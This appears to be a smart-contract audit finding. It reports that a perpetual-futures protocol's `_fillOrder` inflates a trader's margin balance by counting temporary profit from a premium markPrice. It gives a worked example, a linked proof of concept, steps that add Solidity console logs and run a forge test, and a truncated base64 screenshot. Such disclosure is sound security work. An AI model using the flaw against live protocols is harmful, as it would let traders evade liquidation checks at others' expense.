A trader that is adding to an existing position may receive temporary profits from a premium `markPrice`. The temporary profits should be subtracted from `marginBalanceUsd` to avoid over-inflating the trader's actual margin balance.

## Vulnerability Detail

If a trader adds to an existing position and worsens the skew (e.g. long trade in a long skewed market), he receives a `markPrice` that makes the existing position profitable.

Consider this example:

* Bob has a +10 long at \$100, market is skewed long
* Bob creates another +10 long (total +20) and receives a 'premium' markPrice of \$110 for worsening the skew
* During `_fillOrder`, PnL for the old position is $10 * 10 =$100 and Bob receives \$100 in USDz collateral

This 'profit' however is temporary as the `markPrice` is stored in the new position which would offset the temporary profit when PnL is calculated after.

However, in `_fillOrder`, when performing a check if the new position is liquidatable, `validateMarginRequirement` does not take into consideration this temporary profit obtained from the higher markPrice. This results in an over-inflated `marginBalanceUsd`.

See POC here:<https://gist.github.com/giraffe0x/5929402e8d514366d4d6110d4e280012>\
Instructions for POC:

* Add test file to folder \`test/integration/settlement-branch/fillMarketOrder
* Add these console logs to SettlementBranch.sol:L431

```solidity
console.log("ENTER SettlementBranch._fillOrder");

console.log("getMarginBalanceUsd:", tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18).intoUint256());

console.log("EXIT SettlementBranch._fillOrder");

tradingAccount.validateMarginRequirement();
);
```

* Add console logs to LiquidationBranch.sol:L77

```solidity
console.log("ENTER LiquidationBranch.checkLiquidatableAccounts");

console.log("getMarginBalanceUsd:", tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18).intoUint256());

console.log("EXIT LiquidationBranch.checkLiquidatableAccounts");

SD59x18 marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18);
```

* Remember to import: `import { console } from "forge-std/console.sol";`
* Run `forge test --mt test_POC_NeedToDiscountMargin -vv`

Observe in logs below that marginBalance calculated in `_fillOrder` is higher than in `checkLiquidatableAccounts` which indicates that when filling the order, margin balance is over-inflated.\
![](data:image/png;base64,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ISAEhIAQEALRCPxRdEolFAJCQAgIASEgBISAEDAExEBpIAgBISAEhIAQEAJCoCACYqAKAqbkQkAICAEhIASEgBAQA6UxIASEgBAQAkJACAiBggiIgSoImJILASEgBISAEBACQkAMlMaAEBACQkAICAEhIAQKIiAGqiBgSi4EhIAQEAJCQAgIATFQGgNCQAgIASEgBISAECiIgBiogoApuRAQAkJACAgBISAExEBpDAgBISAEhIAQEAJCoCACYqAKAqbkQkAICAEhIASEgBAQA6UxIASEgBAQAkJACAiBggiIgSoImJILASEgBISAEBACQkAMlMaAEBACQkAICAEhIAQKIiAGqiBgSi4EhIAQEAJCQAgIATFQGgNCQAgIASEgBISAECiIgBiogoApuRAQAkJACAgBISAExEBpDAgBISAEhIAQEAJCoCACYqAKAqbkQkAICAEhIASEgBAQA6UxIASEgBAQAkJACAiBggiIgSoImJILASEgBISAEBACQkAMlMaAEBACQkAICAEhIAQKIiAGqiBgSi4EhIAQEAJCQAgIATFQGgNCQAi0aAT+4i/+IvnOd76T/Nmf/VmLrqcqJwSEQPtC4Evtq7nxrd1ss80Sfmn6/e9/n/CD/uiP/sj2/Zhzfo+fI005+r//+z+7FFtWmI/fG56L3ae8r3/968k222yTvPHGG8knn3wSe2vV0/393/99ssMOO5TyfeSRR5Jf/vKXpePWupPu98b0V60wOPnkk208PPnkk7Uq0sr5y7/8y2SfffZJ/vzP/zz57W9/mzz66KP1yh8/fnwyYMCA5KabbkquvPLKetdixk9MGs90u+22S772ta8lb775ZlWeiw4dOiSnn3568i//8i/Jz372My9GWyEgBNoAAmKgynTi1VdfnQwePHiTq3Pnzk0uuuiiZOedd06eeOKJhMnmuOOOK6W7+eabk86dO9sX8ymnnJJcfPHFpWvpnd69eye/+c1vkryyuO/ll19O/vRP/7SUxdtvv53cf//9yZQpU5L/+Z//KZ3P2+nRo0dy/fXXJ3/1V39lSWH0Fi9enJx77rnJxx9/nHd7vev/7//9v+SMM85IfvKTnyQvvfRSvWt+kJfm7/7u75K999472XLLLZM//uM/tgm8NTBQee168cUXk69+9asGAxi/9dZb1l9Tp05N/vd//9fhaVHb0aNH21io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